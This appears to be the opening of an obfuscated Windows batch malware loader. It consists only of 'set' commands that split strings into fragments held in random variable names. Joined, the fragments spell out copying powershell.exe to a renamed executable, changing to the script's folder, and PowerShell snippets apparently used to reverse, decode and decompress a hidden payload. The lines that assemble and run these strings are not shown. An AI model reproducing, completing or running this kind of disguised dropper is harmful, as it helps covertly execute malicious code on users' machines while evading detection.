@echo off
set "DMinZcutDI=Po"
set "hWyzzORnjT=we"
set "WwfrinLPqd=.e"
set "UwZSWlwrek=in"
set "trkVxwvlQn=we"
set "QOJZhLhXWm=s\"
set "GYHhNxuLux=do"
set "lokUCkoJoD=1."
set "vxnJSKoHNu=xe"
set "YeyjlSTCKv=co"
set "DDFUJmfmoE=ws"
set "GbdfkNJolf=0\"
set "qzPZOghViT=em"
set "fjdAHTQuhK=he"
set "LlrSrNTQbl=Sy"
set "dbhLdltJwm=ll"
set "wlYtvJDEGw=ll"
set "QTvaOMLTWI=\v"
set "QGlonnRLYe=st"
set "WJvTFPPqPb=rs"
set "eacGKEMDov=py"
set "XhIWSlNcLU=po"
set "vdtDLjCuMU=\W"
set "PRaprqQfjJ=rS"
set "cxIQLeGnbq=he"
set "nYjPtkUEBE=Wi"
set "ytlAUPJogd=32"
set "KrNqwFQSwm= C"
set "hDlSxKKbxW= /"
set "DPgHRiOYTo=:\"
set "bagxRpTvOC=ow"
set "UQVqFGriMF=nd"
set "mlJseGrqHx=y "
set "VBkYMWpvLh=cd"
set "jFTARrQTPn= %~dp0"
set "xddFPUXEWG=1] -"
set "XlxwYiRkqU=ne);"
set "DHLdvDEhwj=raph"
set "YtCnHzzNNm=ck($"
set "mOepSatVpI=7;$l"
set "sYMrDaAScl= [st"
set "OOUpxoHNtm=..-1"
set "dwaclJDRxy=.-16"
set "KdofuYJzjY=i.En"
set "TrTkuwhrYO=SWP."
set "OQrBFMVhtG=Stre"
set "EpDbgvWHjZ=.Con"
set "AURpcShuOt= = $"
set "dLTsrsRIGG=ress"
set "txjddLArig=lXOH"
